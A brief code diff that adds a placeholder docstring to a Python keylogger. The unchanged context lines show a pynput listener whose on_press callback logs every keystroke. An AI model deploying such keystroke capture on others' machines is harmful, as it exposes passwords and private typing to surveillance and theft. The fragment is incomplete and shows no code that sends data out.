@@ -7,6 +7,12 @@ level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
 def on_press(key):
+    """
+    Called when a keyboard press.
+
+    Args:
+        key: (str): write your description
+    """
     logging.info(str(key))
 
 with Listener(on_press=on_press) as listener:
